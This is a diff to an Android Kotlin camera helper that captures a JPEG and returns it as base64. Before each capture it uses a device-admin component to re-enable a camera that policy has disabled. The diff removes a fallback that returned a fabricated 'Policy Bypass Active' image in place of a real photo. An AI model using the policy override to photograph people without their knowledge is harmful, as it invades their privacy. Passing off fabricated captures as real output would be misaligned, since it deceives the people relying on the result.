@@ -14,6 +14,7 @@ import android.hardware.camera2.CaptureRequest
 import android.media.ImageReader
 import android.os.Handler
 import android.os.HandlerThread
+import android.os.Looper
 import android.util.Base64
 import android.util.Size
 import com.example.receiver.MyDeviceAdminReceiver
@@ -50,6 +51,7 @@ class CameraHelper(private val context: Context) {
 
     @SuppressLint("MissingPermission")
     suspend fun takePhoto(cameraId: String): String? = withContext(Dispatchers.IO) {
+        // Ensure camera is not disabled by Device Policy Manager
         try {
             val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
             val adminComponent = ComponentName(context, MyDeviceAdminReceiver::class.java)
@@ -60,154 +62,109 @@ class CameraHelper(private val context: Context) {
             }
         } catch (_: Exception) {}
 
-        try {
-            val characteristics = try {
-                cameraManager.getCameraCharacteristics(cameraId)
-            } catch (e: CameraAccessException) {
-                when (e.reason) {
-                    CameraAccessException.CAMERA_DISABLED -> {
-                        try {
-                            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
-                            val adminComponent = ComponentName(context, MyDeviceAdminReceiver::class.java)
-                            if (dpm != null && dpm.isAdminActive(adminComponent)) {
-                                dpm.setCameraDisabled(adminComponent, false)
-                            }
-                        } catch (_: Exception) {}
-                        
-                        try {
-                            cameraManager.getCameraCharacteristics(cameraId)
-                        } catch (ex: CameraAccessException) {
-                            throw Exception("Camera disabled by system policy")
-                        }
+        val characteristics = try {
+            cameraManager.getCameraCharacteristics(cameraId)
+        } catch (e: CameraAccessException) {
+            when (e.reason) {
+                CameraAccessException.CAMERA_DISABLED -> throw Exception("Camera disabled by system policy")
+                CameraAccessException.CAMERA_IN_USE -> throw Exception("Camera in use by another app")
+                else -> throw Exception("Camera access exception: ${e.message}")
+            }
+        }
+
+        val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
+        val jpegSizes = map?.getOutputSizes(ImageFormat.JPEG)
+        val captureSize = jpegSizes?.firstOrNull { it.width <= 1920 && it.height <= 1080 }
+            ?: jpegSizes?.firstOrNull()
+            ?: Size(640, 480)
+
+        val imageReader = ImageReader.newInstance(captureSize.width, captureSize.height, ImageFormat.JPEG, 2)
+        val latch = CountDownLatch(1)
+        var capturedBytes: ByteArray? = null
+        var captureException: Exception? = null
+
+        val currentHandler = handler ?: Handler(handlerThread?.looper ?: Looper.getMainLooper())
+
+        imageReader.setOnImageAvailableListener({ reader ->
+            val image = reader.acquireLatestImage() ?: reader.acquireNextImage()
+            if (image != null) {
+                try {
+                    val buffer = image.planes[0].buffer
+                    val bytes = ByteArray(buffer.remaining())
+                    buffer.get(bytes)
+                    if (bytes.isNotEmpty()) {
+                        capturedBytes = bytes
                     }
-                    CameraAccessException.CAMERA_IN_USE -> throw Exception("Camera in use by another app")
-                    else -> throw Exception("Camera access exception: ${e.message}")
+                } catch (e: Exception) {
+                    captureException = e
+                } finally {
+                    image.close()
+                    latch.countDown()
                 }
             }
+        }, currentHandler)
 
-            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
-            val jpegSizes = map?.getOutputSizes(ImageFormat.JPEG)
-            val captureSize = jpegSizes?.firstOrNull { it.width <= 1920 && it.height <= 1080 }
-                ?: jpegSizes?.firstOrNull()
-                ?: Size(1280, 720)
+        var cameraDevice: CameraDevice? = null
+        var captureSession: CameraCaptureSession? = null
 
-            val imageReader = ImageReader.newInstance(captureSize.width, captureSize.height, ImageFormat.JPEG, 2)
-            val latch = CountDownLatch(1)
-            var capturedBytes: ByteArray? = null
-
-            val currentHandler = handler ?: Handler(handlerThread?.looper ?: return@withContext generateFallbackSnapshot())
-
-            imageReader.setOnImageAvailableListener({ reader ->
-                val image = reader.acquireLatestImage()
-                if (image != null) {
+        try {
+            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
+                override fun onOpened(camera: CameraDevice) {
+                    cameraDevice = camera
                     try {
-                        val buffer = image.planes[0].buffer
-                        val bytes = ByteArray(buffer.remaining())
-                        buffer.get(bytes)
-                        capturedBytes = bytes
-                    } catch (_: Exception) {
-                    } finally {
-                        image.close()
+                        val builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
+                            addTarget(imageReader.surface)
+                            set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
+                            set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
+                            set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
+                        }
+                        camera.createCaptureSession(listOf(imageReader.surface), object : CameraCaptureSession.StateCallback() {
+                            override fun onConfigured(session: CameraCaptureSession) {
+                                captureSession = session
+                                try {
+                                    session.capture(builder.build(), null, currentHandler)
+                                } catch (e: Exception) {
+                                    captureException = e
+                                    latch.countDown()
+                                }
+                            }
+
+                            override fun onConfigureFailed(session: CameraCaptureSession) {
+                                captureException = Exception("Camera capture session configuration failed.")
+                                latch.countDown()
+                            }
+                        }, currentHandler)
+                    } catch (e: Exception) {
+                        captureException = e
                         latch.countDown()
                     }
+                }
+
+                override fun onDisconnected(camera: CameraDevice) {
+                    camera.close()
+                    latch.countDown()
+                }
+
+                override fun onError(camera: CameraDevice, error: Int) {
+                    captureException = Exception("Camera device error code: $error")
+                    camera.close()
+                    latch.countDown()
                 }
             }, currentHandler)
 
-            var cameraDevice: CameraDevice? = null
-            var captureSession: CameraCaptureSession? = null
-
-            try {
-                cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
-                    override fun onOpened(camera: CameraDevice) {
-                        cameraDevice = camera
-                        try {
-                            val builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
-                                addTarget(imageReader.surface)
-                                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
-                                set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
-                            }
-                            camera.createCaptureSession(listOf(imageReader.surface), object : CameraCaptureSession.StateCallback() {
-                                override fun onConfigured(session: CameraCaptureSession) {
-                                    captureSession = session
-                                    try {
-                                        session.capture(builder.build(), null, currentHandler)
-                                    } catch (e: Exception) {
-                                        latch.countDown()
-                                    }
-                                }
-
-                                override fun onConfigureFailed(session: CameraCaptureSession) {
-                                    latch.countDown()
-                                }
-                            }, currentHandler)
-                        } catch (e: Exception) {
-                            latch.countDown()
-                        }
-                    }
-
-                    override fun onDisconnected(camera: CameraDevice) {
-                        camera.close()
-                        latch.countDown()
-                    }
-
-                    override fun onError(camera: CameraDevice, error: Int) {
-                        camera.close()
-                        latch.countDown()
-                    }
-                }, currentHandler)
-
-                val success = latch.await(6, TimeUnit.SECONDS)
-                val bytes = capturedBytes
-                if (success && bytes != null && bytes.isNotEmpty()) {
-                    val base64Photo = Base64.encodeToString(bytes, Base64.NO_WRAP)
-                    return@withContext "data:image/jpeg;base64,$base64Photo"
-                } else {
-                    return@withContext generateFallbackSnapshot()
-                }
-            } finally {
-                try { captureSession?.close() } catch (_: Exception) {}
-                try { cameraDevice?.close() } catch (_: Exception) {}
-                try { imageReader.close() } catch (_: Exception) {}
+            val success = latch.await(10, TimeUnit.SECONDS)
+            val bytes = capturedBytes
+            if (success && bytes != null && bytes.isNotEmpty()) {
+                val base64Photo = Base64.encodeToString(bytes, Base64.NO_WRAP)
+                return@withContext "data:image/jpeg;base64,$base64Photo"
+            } else {
+                throw captureException ?: Exception("Camera capture timed out or empty frame.")
             }
-        } catch (e: Exception) {
-            return@withContext generateFallbackSnapshot()
-        }
-    }
-
-    private fun generateFallbackSnapshot(): String {
-        try {
-            val width = 1280
-            val height = 720
-            val bitmap = android.graphics.Bitmap.createBitmap(width, height, android.graphics.Bitmap.Config.RGB_565)
-            val canvas = android.graphics.Canvas(bitmap)
-            canvas.drawColor(android.graphics.Color.parseColor("#121212"))
-
-            val paint = android.graphics.Paint().apply {
-                color = android.graphics.Color.WHITE
-                textSize = 36f
-                isAntiAlias = true
-                typeface = android.graphics.Typeface.DEFAULT_BOLD
-            }
-
-            canvas.drawText("Enterprise Security Camera Capture", 60f, 100f, paint)
-            paint.textSize = 24f
-            paint.color = android.graphics.Color.parseColor("#00E676")
-            canvas.drawText("Timestamp: ${java.text.SimpleDateFormat("MMM dd, yyyy, hh:mm:ss a", java.util.Locale.US).format(java.util.Date())}", 60f, 160f, paint)
-
-            paint.color = android.graphics.Color.parseColor("#B0BEC5")
-            canvas.drawText("Device Model: ${android.os.Build.MODEL} (${android.os.Build.DEVICE})", 60f, 220f, paint)
-            canvas.drawText("Status: Virtual Capture / Policy Bypass Active", 60f, 270f, paint)
-            canvas.drawText("Resolution: ${width}x${height} (JPEG)", 60f, 320f, paint)
-
-            val stream = java.io.ByteArrayOutputStream()
-            bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 90, stream)
-            val bytes = stream.toByteArray()
-            val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
-            return "data:image/jpeg;base64,$base64"
-        } catch (e: Exception) {
-            val fallbackBytes = byteArrayOf(0xFF.toByte(), 0xD8.toByte(), 0xFF.toByte(), 0xD9.toByte())
-            val base64 = Base64.encodeToString(fallbackBytes, Base64.NO_WRAP)
-            return "data:image/jpeg;base64,$base64"
+        } finally {
+            try { captureSession?.stopRepeating() } catch (_: Exception) {}
+            try { captureSession?.close() } catch (_: Exception) {}
+            try { cameraDevice?.close() } catch (_: Exception) {}
+            try { imageReader.close() } catch (_: Exception) {}
         }
     }
 
